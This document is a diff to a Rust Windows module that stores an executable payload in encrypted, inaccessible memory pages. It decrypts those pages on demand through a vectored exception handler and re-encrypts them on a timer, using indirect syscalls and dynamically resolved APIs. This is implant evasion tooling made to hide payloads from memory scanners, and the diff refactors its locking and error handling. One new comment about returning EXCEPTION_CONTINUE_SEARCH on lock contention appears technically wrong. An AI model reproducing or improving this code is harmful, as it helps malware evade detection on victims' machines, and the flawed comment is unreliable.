@@ -13,20 +13,9 @@
 #![cfg(all(target_os = "windows", target_arch = "x86_64", feature = "page-fault-exec"))]
 
 use std::alloc::Layout;
-use std::cell::UnsafeCell;
 use std::ffi::c_void;
 use std::sync::atomic::{AtomicBool, AtomicPtr, AtomicU32, AtomicU64, Ordering};
-use std::sync::OnceLock;
-
-/// A wrapper around `UnsafeCell<T>` that implements `Sync`.
-///
-/// Safety justification: all access is single-threaded by design — the VEH
-/// handler runs on the faulting thread and the timer APC runs on the same
-/// thread during alertable wait.  No concurrent mutation is possible.
-struct SyncCell<T>(UnsafeCell<T>);
-
-unsafe impl<T> Sync for SyncCell<T> {}
-unsafe impl<T> Send for SyncCell<T> {}
+use std::sync::{Mutex, OnceLock};
 
 use chacha20::cipher::KeyIvInit;
 use chacha20poly1305::{
@@ -153,8 +142,10 @@ unsafe impl Sync for ProtectedPage {}
 /// Encryption key (32 bytes).  Set once during initialization.
 static ENCRYPTION_KEY: OnceLock<[u8; 32]> = OnceLock::new();
 
-/// The single PageFaultExec instance.
-static EXEC_INSTANCE: OnceLock<SyncCell<PageFaultExec>> = OnceLock::new();
+/// The single PageFaultExec instance, protected by a Mutex to prevent data
+/// races when the VEH handler fires on one thread while the re-encryption
+/// timer APC runs on another.  (HIGH-002)
+static EXEC_INSTANCE: OnceLock<Mutex<PageFaultExec>> = OnceLock::new();
 
 /// Whether the VEH handler has been installed.
 static VEH_INSTALLED: AtomicBool = AtomicBool::new(false);
@@ -179,17 +170,24 @@ static STAT_ANOMALY: AtomicBool = AtomicBool::new(false);
 // ─── XChaCha20-Poly1305 Helpers ───────────────────────────────────────────
 
 /// Encrypt `data` in-place with XChaCha20-Poly1305.
-/// Returns the 16-byte authentication tag.
-fn xchacha20_encrypt(key: &[u8; 32], nonce: &[u8; 24], data: &mut [u8]) -> [u8; 16] {
+/// Returns `Ok(tag)` on success, `Err` on failure.
+///
+/// Returns `Result` instead of panicking because this may be called from
+/// a VEH handler or timer APC where unwinding is undefined behavior.
+fn xchacha20_encrypt(
+    key: &[u8; 32],
+    nonce: &[u8; 24],
+    data: &mut [u8],
+) -> Result<[u8; 16], &'static str> {
     let iv = XNonce::from_slice(nonce);
     let cipher = XChaCha20Poly1305::new(key.into());
     let aad: &[u8] = b"";
     let mut buf = data.to_vec();
     let tag = cipher
         .encrypt_in_place_detached(iv, aad, &mut buf)
-        .expect("XChaCha20-Poly1305 encryption should not fail for valid input");
+        .map_err(|_| "XChaCha20-Poly1305 encryption failed")?;
     data.copy_from_slice(&buf);
-    tag.into()
+    Ok(tag.into())
 }
 
 /// Decrypt `data` in-place with XChaCha20-Poly1305.
@@ -227,7 +225,7 @@ unsafe fn protect_memory(base: *mut c_void, size: usize, new_protect: u64) -> u6
         &mut old_protect as *mut u64 as u64,
     );
     if status < 0 {
-        log::warn!(
+        tracing::warn!(
             "page_fault_exec: NtProtectVirtualMemory({:#x}, {:#x}) failed: NTSTATUS {:#010x}",
             base as usize,
             new_protect,
@@ -240,11 +238,14 @@ unsafe fn protect_memory(base: *mut c_void, size: usize, new_protect: u64) -> u6
 }
 
 /// Allocate virtual memory via NtAllocateVirtualMemory.
-/// Returns the allocated base pointer, or null on failure.
-unsafe fn allocate_memory(size: usize) -> *mut c_void {
+/// Returns the allocated base pointer on success, or `Err` on failure.
+///
+/// Propagates syscall dispatch failures (unresolved SSN / gadget) and
+/// NTSTATUS errors separately so callers can distinguish between them.
+unsafe fn allocate_memory(size: usize) -> Result<*mut c_void, &'static str> {
     let mut base: *mut c_void = std::ptr::null_mut();
     let mut region_size = size as u64;
-    let status = crate::syscall!(
+    let status = match crate::syscall!(
         "NtAllocateVirtualMemory",
         crate::win_types::CURRENT_PROCESS as u64, // (HANDLE)-1
         &mut base as *mut _ as u64,
@@ -252,43 +253,62 @@ unsafe fn allocate_memory(size: usize) -> *mut c_void {
         &mut region_size as *mut _ as u64,
         MEM_COMMIT | MEM_RESERVE,
         PAGE_READWRITE,
-    )
-    .unwrap_or(-1);
+    ) {
+        Ok(s) => s,
+        Err(_) => {
+            tracing::warn!(
+                "page_fault_exec: NtAllocateVirtualMemory syscall dispatch failed (SSN/gadget unresolved)"
+            );
+            return Err("NtAllocateVirtualMemory syscall dispatch failed — SSN or gadget not resolved");
+        }
+    };
     if status < 0 || base.is_null() {
-        log::warn!(
+        tracing::warn!(
             "page_fault_exec: NtAllocateVirtualMemory({} bytes) failed: NTSTATUS {:#010x}",
             size,
             status as u32
         );
-        std::ptr::null_mut()
+        Err("NtAllocateVirtualMemory returned error NTSTATUS")
     } else {
-        log::debug!(
+        tracing::debug!(
             "page_fault_exec: allocated {} bytes at {:#x}",
             size,
             base as usize
         );
-        base
+        Ok(base)
     }
 }
 
 /// Free virtual memory via NtFreeVirtualMemory.
-unsafe fn free_memory(base: *mut c_void) {
+/// Returns `Ok(())` on success, `Err` on failure.
+unsafe fn free_memory(base: *mut c_void) -> Result<(), &'static str> {
     let mut base_ptr = base;
     let mut region_size: usize = 0; // MEM_RELEASE ignores size
-    let status = crate::syscall!(
+    let status = match crate::syscall!(
         "NtFreeVirtualMemory",
         crate::win_types::CURRENT_PROCESS as u64,
         &mut base_ptr as *mut _ as u64,
         &mut region_size as *mut _ as u64,
         MEM_RELEASE,
-    )
-    .unwrap_or(-1);
+    ) {
+        Ok(s) => s,
+        Err(_) => {
+            tracing::warn!(
+                "page_fault_exec: NtFreeVirtualMemory({:#x}) syscall dispatch failed (SSN/gadget unresolved)",
+                base as usize
+            );
+            return Err("NtFreeVirtualMemory syscall dispatch failed — SSN or gadget not resolved");
+        }
+    };
     if status < 0 {
-        log::warn!(
+        tracing::warn!(
             "page_fault_exec: NtFreeVirtualMemory({:#x}) failed: NTSTATUS {:#010x}",
             base as usize,
             status as u32
         );
+        Err("NtFreeVirtualMemory returned error NTSTATUS")
+    } else {
+        Ok(())
     }
 }
 
@@ -350,10 +370,8 @@ struct PageFaultExec {
     timer_active: bool,
 }
 
-// Safety: PageFaultExec is only accessed through UnsafeCell inside a OnceLock.
-// All mutation is single-threaded (timer APC runs on the same thread in
-// alertable wait; VEH handler runs on the faulting thread).
-unsafe impl Sync for PageFaultExec {}
+// PageFaultExec is accessed through a Mutex, so Sync is provided by the
+// Mutex wrapper.  No manual unsafe impl needed (HIGH-002).
 
 impl PageFaultExec {
     /// Create a new (empty) PageFaultExec.
@@ -399,7 +417,7 @@ impl PageFaultExec {
             return Err("payload too large — exceeds MAX_PAGES");
         }
 
-        log::info!(
+        tracing::info!(
             "page_fault_exec: initializing with {} bytes → {} pages",
             payload.len(),
             num_pages
@@ -412,17 +430,19 @@ impl PageFaultExec {
             let chunk = &payload[offset..offset + chunk_size];
 
             // Allocate a full page (always PAGE_SIZE for alignment).
-            let base = allocate_memory(PAGE_SIZE);
-            if base.is_null() {
-                // Cleanup previously allocated pages on failure.
-                for pp in &self.pages {
-                    if !pp.base.is_null() {
-                        free_memory(pp.base);
+            let base = match allocate_memory(PAGE_SIZE) {
+                Ok(b) => b,
+                Err(e) => {
+                    // Cleanup previously allocated pages on failure.
+                    for pp in &self.pages {
+                        if !pp.base.is_null() {
+                            let _ = free_memory(pp.base);
+                        }
                     }
+                    self.pages.clear();
+                    return Err(e);
                 }
-                self.pages.clear();
-                return Err("failed to allocate memory for page");
-            }
+            };
 
             // Copy payload chunk into the allocated page.
             std::ptr::copy_nonoverlapping(chunk.as_ptr(), base as *mut u8, chunk_size);
@@ -441,12 +461,25 @@ impl PageFaultExec {
 
             // Encrypt in-place.
             let page_slice = std::slice::from_raw_parts_mut(base as *mut u8, PAGE_SIZE);
-            let tag = xchacha20_encrypt(key, &nonce, page_slice);
+            let tag = match xchacha20_encrypt(key, &nonce, page_slice) {
+                Ok(t) => t,
+                Err(e) => {
+                    // Cleanup: free this page and all previously allocated pages.
+                    let _ = free_memory(base);
+                    for pp in &self.pages {
+                        if !pp.base.is_null() {
+                            let _ = free_memory(pp.base);
+                        }
+                    }
+                    self.pages.clear();
+                    return Err(e);
+                }
+            };
 
             // Set page to PAGE_NOACCESS (encrypted & inaccessible).
             let old_prot = protect_memory(base, PAGE_SIZE, PAGE_NOACCESS);
             if old_prot == 0 {
-                log::warn!("page_fault_exec: failed to set PAGE_NOACCESS for page {}", i);
+                tracing::warn!("page_fault_exec: failed to set PAGE_NOACCESS for page {}", i);
             }
 
             self.pages.push(ProtectedPage {
@@ -468,7 +501,7 @@ impl PageFaultExec {
                 if !pp.base.is_null() {
                     // Temporarily make writable so we can free.
                     protect_memory(pp.base, pp.size, PAGE_READWRITE);
-                    free_memory(pp.base);
+                    let _ = free_memory(pp.base);
                 }
             }
             self.pages.clear();
@@ -479,7 +512,7 @@ impl PageFaultExec {
         // Start the re-encryption timer.
         self.start_reencrypt_timer();
 
-        log::info!(
+        tracing::info!(
             "page_fault_exec: initialized {} pages, timer interval {} ms",
             self.active_count,
             self.reencrypt_interval_ms
@@ -550,7 +583,7 @@ impl PageFaultExec {
         // Encrypt in-place.
         let page_slice =
             unsafe { std::slice::from_raw_parts_mut(pp.base as *mut u8, pp.size) };
-        pp.tag = xchacha20_encrypt(key, &pp.nonce, page_slice);
+        pp.tag = xchacha20_encrypt(key, &pp.nonce, page_slice)?;
 
         // Set page to PAGE_NOACCESS.
         unsafe { protect_memory(pp.base, pp.size, PAGE_NOACCESS) };
@@ -574,7 +607,7 @@ impl PageFaultExec {
             };
             if should_reencrypt {
                 if let Err(e) = self.reencrypt_page(i) {
-                    log::warn!("page_fault_exec: re-encrypt page {} failed: {}", i, e);
+                    tracing::warn!("page_fault_exec: re-encrypt page {} failed: {}", i, e);
                 }
             }
         }
@@ -594,7 +627,7 @@ impl PageFaultExec {
                 0u64,          // NotificationTimer
             );
             if status < 0 {
-                log::warn!(
+                tracing::warn!(
                     "page_fault_exec: NtCreateTimer failed: {:#010x}",
                     status as u32
                 );
@@ -616,7 +649,7 @@ impl PageFaultExec {
                 0u64,                        // PreviousState = NULL
             );
             if status < 0 {
-                log::warn!(
+                tracing::warn!(
                     "page_fault_exec: NtSetTimer failed: {:#010x}",
                     status as u32
                 );
@@ -624,7 +657,7 @@ impl PageFaultExec {
             }
 
             self.timer_active = true;
-            log::debug!(
+            tracing::debug!(
                 "page_fault_exec: re-encryption timer started ({} ms)",
                 interval_ms
             );
@@ -633,7 +666,7 @@ impl PageFaultExec {
 
     /// Shut down the engine: re-encrypt all pages, remove VEH, free memory.
     pub fn shutdown(&mut self) {
-        log::info!("page_fault_exec: shutting down");
+        tracing::info!("page_fault_exec: shutting down");
 
         // Stop the timer.
         let timer = TIMER_HANDLE.swap(std::ptr::null_mut(), Ordering::SeqCst);
@@ -657,14 +690,14 @@ impl PageFaultExec {
                     // Page is encrypted + NOACCESS; make writable to free.
                     unsafe { protect_memory(pp.base, pp.size, PAGE_READWRITE) };
                 }
-                unsafe { free_memory(pp.base) };
+                unsafe { let _ = free_memory(pp.base); };
                 pp.base = std::ptr::null_mut();
             }
         }
         self.pages.clear();
         self.active_count = 0;
 
-        log::info!("page_fault_exec: shutdown complete");
+        tracing::info!("page_fault_exec: shutdown complete");
     }
 
     /// Look up the page index for a given fault address.
@@ -703,15 +736,15 @@ unsafe extern "system" fn reencrypt_timer_apc(
     _timer_high_value: u32,
 ) {
     // Re-encrypt stale pages.
-    if let Some(cell) = EXEC_INSTANCE.get() {
-        let exec = &mut *cell.0.get();
+    if let Some(mutex) = EXEC_INSTANCE.get() {
+        let mut exec = mutex.lock().unwrap_or_else(|e| e.into_inner());
         exec.reencrypt_all();
 
         // Check for anomaly.
         let faults = STAT_FAULT_COUNT.load(Ordering::Relaxed);
         if faults > MAX_FAULTS_BEFORE_ANOMALY {
             STAT_ANOMALY.store(true, Ordering::Relaxed);
-            log::warn!(
+            tracing::warn!(
                 "page_fault_exec: anomaly detected — {} total faults",
                 faults
             );
@@ -770,11 +803,24 @@ unsafe extern "system" fn veh_page_fault_handler(
     let fault_addr = record.ExceptionInformation[1];
 
     // Look up the page in the global EXEC_INSTANCE.
-    let exec_cell = match EXEC_INSTANCE.get() {
-        Some(c) => c,
+    let exec_mutex = match EXEC_INSTANCE.get() {
+        Some(m) => m,
         None => return EXCEPTION_CONTINUE_SEARCH,
     };
-    let exec = &mut *exec_cell.0.get();
+    let mut exec = match exec_mutex.try_lock() {
+        Ok(guard) => guard,
+        Err(std::sync::TryLockError::WouldBlock) => {
+            // Another thread holds the lock (e.g. re-encryption timer).
+            // We cannot safely wait inside a VEH handler, so defer to the
+            // next fault — the page will fault again immediately once this
+            // handler returns EXCEPTION_CONTINUE_SEARCH.
+            return EXCEPTION_CONTINUE_SEARCH;
+        }
+        Err(std::sync::TryLockError::Poisoned(e)) => {
+            // Lock is poisoned; recover the guard so execution can continue.
+            e.into_inner()
+        }
+    };
 
     let page_index = match exec.find_page_for_address(fault_addr) {
         Some(idx) => idx,
@@ -785,7 +831,7 @@ unsafe extern "system" fn veh_page_fault_handler(
     match exec.decrypt_page(page_index) {
         Ok(()) => {
             STAT_FAULT_COUNT.fetch_add(1, Ordering::Relaxed);
-            log::debug!(
+            tracing::debug!(
                 "page_fault_exec: decrypted page {} at {:#x} (fault at {:#x})",
                 page_index,
                 exec.page_base(page_index) as usize,
@@ -794,7 +840,7 @@ unsafe extern "system" fn veh_page_fault_handler(
             EXCEPTION_CONTINUE_EXECUTION
         }
         Err(e) => {
-            log::error!(
+            tracing::error!(
                 "page_fault_exec: failed to decrypt page {}: {}",
                 page_index,
                 e
@@ -816,7 +862,7 @@ fn install_veh() -> bool {
         )) {
             Some(b) => b,
             None => {
-                log::error!(
+                tracing::error!(
                     "page_fault_exec: failed to resolve kernel32 for AddVectoredExceptionHandler"
                 );
                 return false;
@@ -829,7 +875,7 @@ fn install_veh() -> bool {
         ) {
             Some(a) => a,
             None => {
-                log::error!("page_fault_exec: failed to resolve AddVectoredExceptionHandler");
+                tracing::error!("page_fault_exec: failed to resolve AddVectoredExceptionHandler");
                 return false;
             }
         };
@@ -844,13 +890,13 @@ fn install_veh() -> bool {
         // Install as first handler (first=1) for maximum priority.
         let handle = add_veh(1, veh_page_fault_handler);
         if handle.is_null() {
-            log::error!("page_fault_exec: AddVectoredExceptionHandler returned NULL");
+            tracing::error!("page_fault_exec: AddVectoredExceptionHandler returned NULL");
             return false;
         }
 
         VEH_HANDLE.store(handle, Ordering::SeqCst);
         VEH_INSTALLED.store(true, Ordering::Release);
-        log::info!("page_fault_exec: VEH handler installed successfully");
+        tracing::info!("page_fault_exec: VEH handler installed successfully");
         true
     }
 }
@@ -872,7 +918,7 @@ fn remove_veh() {
         )) {
             Some(b) => b,
             None => {
-                log::error!(
+                tracing::error!(
                     "page_fault_exec: cannot resolve kernel32 for RemoveVectoredExceptionHandler"
                 );
                 return;
@@ -885,7 +931,7 @@ fn remove_veh() {
         ) {
             Some(a) => a,
             None => {
-                log::error!("page_fault_exec: cannot resolve RemoveVectoredExceptionHandler");
+                tracing::error!("page_fault_exec: cannot resolve RemoveVectoredExceptionHandler");
                 return;
             }
         };
@@ -896,9 +942,9 @@ fn remove_veh() {
         let remove_veh: FnRemoveVectoredExceptionHandler = std::mem::transmute(fn_addr);
         let result = remove_veh(handle);
         if result == 0 {
-            log::warn!("page_fault_exec: RemoveVectoredExceptionHandler returned 0");
+            tracing::warn!("page_fault_exec: RemoveVectoredExceptionHandler returned 0");
         } else {
-            log::info!("page_fault_exec: VEH handler removed");
+            tracing::info!("page_fault_exec: VEH handler removed");
         }
     }
 
@@ -929,15 +975,16 @@ pub fn set_encryption_key(key: [u8; 32]) -> bool {
 pub unsafe fn initialize(payload: &[u8]) -> Result<(), &'static str> {
     // Create the instance if it doesn't exist yet.
     if EXEC_INSTANCE.get().is_none() {
-        let _ = EXEC_INSTANCE.set(SyncCell(UnsafeCell::new(PageFaultExec::new(
+        let _ = EXEC_INSTANCE.set(Mutex::new(PageFaultExec::new(
             DEFAULT_REENCRYPT_INTERVAL_MS,
-        ))));
+        )));
     }
 
-    let cell = EXEC_INSTANCE
+    let mutex = EXEC_INSTANCE
         .get()
         .ok_or("failed to create PageFaultExec instance")?;
-    (*cell.0.get()).initialize(payload)
+    let mut exec = mutex.lock().unwrap_or_else(|e| e.into_inner());
+    exec.initialize(payload)
 }
 
 /// Shut down the engine and release all resources.
@@ -947,8 +994,9 @@ pub unsafe fn initialize(payload: &[u8]) -> Result<(), &'static str> {
 /// Must be called from the same thread that called `initialize()`.
 /// No code within protected pages may be executing when this is called.
 pub unsafe fn shutdown() {
-    if let Some(cell) = EXEC_INSTANCE.get() {
-        (*cell.0.get()).shutdown();
+    if let Some(mutex) = EXEC_INSTANCE.get() {
+        let mut exec = mutex.lock().unwrap_or_else(|e| e.into_inner());
+        exec.shutdown();
     }
 }
 
@@ -968,8 +1016,8 @@ pub unsafe fn shutdown() {
 /// - The caller must ensure no re-encryption occurs during execution
 ///   (the timer APC runs on the same thread in alertable wait).
 pub unsafe fn execute_protected_function(payload_offset: usize) -> Option<*mut c_void> {
-    let cell = EXEC_INSTANCE.get()?;
-    let exec = &mut *cell.0.get();
+    let mutex = EXEC_INSTANCE.get()?;
+    let mut exec = mutex.lock().unwrap_or_else(|e| e.into_inner());
 
     // Determine which page the offset falls in.
     let page_index = payload_offset / PAGE_SIZE;
@@ -977,7 +1025,7 @@ pub unsafe fn execute_protected_function(payload_offset: usize) -> Option<*mut c
 
     // Ensure the page is decrypted.
     if let Err(e) = exec.decrypt_page(page_index) {
-        log::error!(
+        tracing::error!(
             "page_fault_exec: failed to decrypt page {} for execution: {}",
             page_index,
             e
@@ -1024,9 +1072,8 @@ pub struct PageFaultStats {
 
 /// Retrieve current statistics.
 pub fn get_stats() -> PageFaultStats {
-    let active_pages = if let Some(cell) = EXEC_INSTANCE.get() {
-        // Safety: we only read the `decrypted` flag; no mutation.
-        let exec = unsafe { &*cell.0.get() };
+    let active_pages = if let Some(mutex) = EXEC_INSTANCE.get() {
+        let exec = mutex.lock().unwrap_or_else(|e| e.into_inner());
         exec.pages.iter().filter(|p| p.decrypted).count()
     } else {
         0
@@ -1056,7 +1103,7 @@ mod tests {
         let original = b"Hello, page-fault execution engine!".to_vec();
         let mut data = original.clone();
 
-        let tag = xchacha20_encrypt(&key, &nonce, &mut data);
+        let tag = xchacha20_encrypt(&key, &nonce, &mut data).unwrap();
         assert_ne!(data, original, "encrypted data should differ from original");
 
         let result = xchacha20_decrypt(&key, &nonce, &mut data, &tag);
@@ -1072,7 +1119,7 @@ mod tests {
         let original = b"test data".to_vec();
         let mut data = original.clone();
 
-        let tag = xchacha20_encrypt(&key, &nonce, &mut data);
+        let tag = xchacha20_encrypt(&key, &nonce, &mut data).unwrap();
         let result = xchacha20_decrypt(&wrong_key, &nonce, &mut data, &tag);
         assert!(result.is_err(), "decryption with wrong key should fail");
     }
@@ -1085,7 +1132,7 @@ mod tests {
         let original = b"test data".to_vec();
         let mut data = original.clone();
 
-        let tag = xchacha20_encrypt(&key, &nonce, &mut data);
+        let tag = xchacha20_encrypt(&key, &nonce, &mut data).unwrap();
         let result = xchacha20_decrypt(&key, &wrong_nonce, &mut data, &tag);
         assert!(result.is_err(), "decryption with wrong nonce should fail");
     }
@@ -1097,7 +1144,7 @@ mod tests {
         let original = b"test data for tamper detection".to_vec();
         let mut data = original.clone();
 
-        let tag = xchacha20_encrypt(&key, &nonce, &mut data);
+        let tag = xchacha20_encrypt(&key, &nonce, &mut data).unwrap();
         data[0] ^= 0xFF; // Tamper with first byte.
         let result = xchacha20_decrypt(&key, &nonce, &mut data, &tag);
         assert!(result.is_err(), "decryption of tampered data should fail");
@@ -1110,7 +1157,7 @@ mod tests {
         let original = b"test data".to_vec();
         let mut data = original.clone();
 
-        let _tag = xchacha20_encrypt(&key, &nonce, &mut data);
+        let _tag = xchacha20_encrypt(&key, &nonce, &mut data).unwrap();
         let wrong_tag = [0xFFu8; 16];
         let result = xchacha20_decrypt(&key, &nonce, &mut data, &wrong_tag);
         assert!(result.is_err(), "decryption with wrong tag should fail");
